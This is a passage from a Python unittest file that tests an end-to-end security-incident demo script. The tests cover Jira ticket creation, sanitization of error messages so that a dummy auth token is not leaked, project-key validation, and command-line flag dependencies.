            persist_audit=False,
            create_ticket=True,
            ticket_provider="jira",
            jira_project="SEC",
            jira_issue_type="Incident",
            jira_client=mock_jira_client,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("[6. DOWNSTREAM TICKETING (JIRA CLOUD WORKFLOW)]", output)
        self.assertIn("Provider:          jira_cloud (live cloud adapter)", output)
        self.assertIn("Ticket Key:        SEC-8888", output)
        self.assertIn("Detail Code:       ticket_created_jira", output)
        mock_jira_client.create_ticket.assert_called_once()

    def test_demo_create_ticket_jira_failure_sanitized(self) -> None:
        """When Jira ticket creation fails, sanitized error is output without leaking sensitive data."""
        mock_jira_client = MagicMock()
        mock_jira_client.create_ticket.side_effect = TicketingError("SECRET_AUTH_TOKEN=dGVzdDp0b2tlbg== HTTP 401")

        in_stream = io.StringIO("approve\n")
        out_stream = io.StringIO()

        code = run_demo(
            mode="synthetic-critical",
            provider=None,
            persist_audit=False,
            create_ticket=True,
            ticket_provider="jira",
            jira_client=mock_jira_client,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 1)
        output = out_stream.getvalue()
        self.assertIn("[!] ticket_creation_failed", output)
        self.assertNotIn("SECRET_AUTH_TOKEN", output)
        self.assertNotIn("dGVzdDp0b2tlbg==", output)
        self.assertNotIn("HTTP 401", output)

    def test_jira_project_and_issue_type_validated_through_ticket_config(self) -> None:
        """Operator inputs for --jira-project and --jira-issue-type pass through TicketConfig validation."""
        in_stream = io.StringIO("approve\n")
        out_stream = io.StringIO()

        # Lowercase / invalid project key must be rejected by TicketConfig
        code = run_demo(
            mode="synthetic-critical",
            provider=None,
            persist_audit=False,
            create_ticket=True,
            ticket_provider="jira",
            jira_project="invalid-lowercase-key",
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 1)
        output = out_stream.getvalue()
        self.assertIn("[!] ticket_creation_failed", output)

    def test_cli_flags_jira_dual_opt_in_validation(self) -> None:
        """Verify argparse enforces dual opt-in and flag dependencies."""
        from scripts.run_end_to_end_demo import main

        # 1. --ticket-provider jira without --create-ticket
        with patch.object(sys, "argv", ["run_end_to_end_demo.py", "--mode", "synthetic-critical", "--ticket-provider", "jira"]):
            with self.assertRaises(SystemExit) as ctx:
                main()
            self.assertEqual(ctx.exception.code, 2)

        # 2. --jira-project without --ticket-provider jira
        with patch.object(sys, "argv", ["run_end_to_end_demo.py", "--mode", "synthetic-critical", "--create-ticket", "--jira-project", "SEC"]):
            with self.assertRaises(SystemExit) as ctx:
                main()
            self.assertEqual(ctx.exception.code, 2)

        # 3. --jira-issue-type without --ticket-provider jira
        with patch.object(sys, "argv", ["run_end_to_end_demo.py", "--mode", "synthetic-critical", "--create-ticket", "--jira-issue-type", "Incident"]):
            with self.assertRaises(SystemExit) as ctx:
                main()
            self.assertEqual(ctx.exception.code, 2)


if __name__ == "__main__":
    unittest.main()
